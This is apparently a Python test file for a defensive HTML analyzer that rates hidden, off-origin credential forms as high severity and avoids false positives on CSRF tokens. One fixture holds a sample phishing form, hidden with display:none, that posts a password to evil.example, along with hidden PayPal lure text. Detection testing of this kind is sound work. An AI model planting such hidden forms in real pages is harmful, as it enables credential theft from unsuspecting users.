#!/usr/bin/env python3
"""test_html_visibility_analysis.py — gate on the visibility-aware HTML analyzer.

Run:  python3 tests/test_html_visibility_analysis.py     (zero deps)
      pytest tests/test_html_visibility_analysis.py -q     (also works)

WHAT THIS PROTECTS
------------------
  1. CONCEALED-INTENT SEVERITY. A hidden credential form posting off-origin is the finding
     that matters -> HIGH. Hidden boilerplate with no intent signal is LOW.
  2. NO CSRF FALSE POSITIVE. Ordinary <input type=hidden name=csrf_token> is normal HTML and
     must NOT be flagged — the earlier version called it HIGH, which would fire on every form.
  3. CLASS-BASED HIDING. A <style> rule that hides a class, applied to an element, is detected
     (kits hide via .d-none / .sr-only far more than inline styles).
  4. OFF-ORIGIN JUDGEMENT. With --origin set, a hidden form/link to another host is external;
     a relative or same-host one is not.
  5. MALFORMED MARKUP DEGRADES, never crashes.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts"))

import html_visibility_analysis as hv  # noqa: E402

FAILURES = []


def check(label, cond, detail=""):
    if cond:
        print("  ok   {}".format(label))
    else:
        print("  FAIL {} {}".format(label, detail))
        FAILURES.append(label)


HIDDEN_CRED_FORM = """
<html><head><style>.sr-only{position:absolute;left:-9999px}</style></head><body>
<div style="display:none">
  <form action="https://evil.example/collect">
    <input type="password" name="password">
  </form>
</div>
<span class="sr-only">PayPal secure login verify your account now</span>
<input type="hidden" name="csrf_token" value="abc">
<a href="https://spam.example/x" style="visibility:hidden">x</a>
</body></html>
"""

BENIGN_FORM = """
<html><body>
<form action="/login" method="post">
  <input type="hidden" name="csrf_token" value="xyz">
  <input type="text" name="user">
  <input type="password" name="password">
  <button>Sign in</button>
</form>
</body></html>
"""

RELATIVE_HIDDEN = """
<div style="display:none"><form action="/local/submit"><input name="q"></form></div>
"""


def test_hidden_cred_form_high():
    print("\n[1] hidden off-origin credential form -> HIGH")
    r = hv.analyze(HIDDEN_CRED_FORM, origin="good.example", brands=["paypal"])
    check("verdict HIGH", r["verdict"] == "high", r["verdict"])
    kinds = {f["kind"]: f["severity"] for f in r["findings"]}
    check("hidden_form present HIGH", kinds.get("hidden_form") == "high", kinds)
    check("hidden password field HIGH", kinds.get("hidden_field") == "high", kinds)
    check("hidden brand text flagged", "hidden_brand_text" in kinds)


def test_no_csrf_false_positive():
    print("\n[2] ordinary visible form with csrf hidden input -> NONE")
    r = hv.analyze(BENIGN_FORM, origin="good.example")
    check("benign form NONE", r["verdict"] == "none", r["verdict"])
    check("no hidden_input recorded for csrf",
          not any(f["kind"] == "hidden_input" for f in r["findings"]), r["findings"])


def test_class_based_hiding():
    print("\n[3] class-based hiding detected from <style>")
    r = hv.analyze(HIDDEN_CRED_FORM, origin="good.example", brands=["paypal"])
    check("sr-only recognised as a hiding class", "sr-only" in r["hiding_classes"], r["hiding_classes"])


def test_off_origin_judgement():
    print("\n[4] off-origin vs relative form action")
    ext = hv.analyze(HIDDEN_CRED_FORM, origin="good.example")
    check("off-origin hidden form is HIGH",
          any(f["kind"] == "hidden_form" and f["severity"] == "high" for f in ext["findings"]))
    rel = hv.analyze(RELATIVE_HIDDEN, origin="good.example")
    check("relative hidden form is not HIGH",
          not any(f["kind"] == "hidden_form" and f["severity"] == "high" for f in rel["findings"]),
          rel["findings"])


def test_malformed_degrades():
    print("\n[5] malformed markup degrades, never crashes")
    for junk in ("<div style=display:none><form action=", "<<<>>", "", "<input type=hidden"):
        try:
            r = hv.analyze(junk)
            check(f"handled {junk!r}", isinstance(r, dict) and "verdict" in r)
        except Exception as e:  # noqa: BLE001
            check(f"handled {junk!r}", False, repr(e))


for _t in (test_hidden_cred_form_high, test_no_csrf_false_positive, test_class_based_hiding,
           test_off_origin_judgement, test_malformed_degrades):
    _t()

if FAILURES:
    print(f"\nFAIL — {len(FAILURES)} check(s) failed:")
    for f in FAILURES:
        print("  -", f)
    sys.exit(1)
print("\nPASS — all html-visibility checks green")


def test_html_visibility_analysis():
    """pytest entry point — module body runs the checks at import time."""
    assert not FAILURES, FAILURES
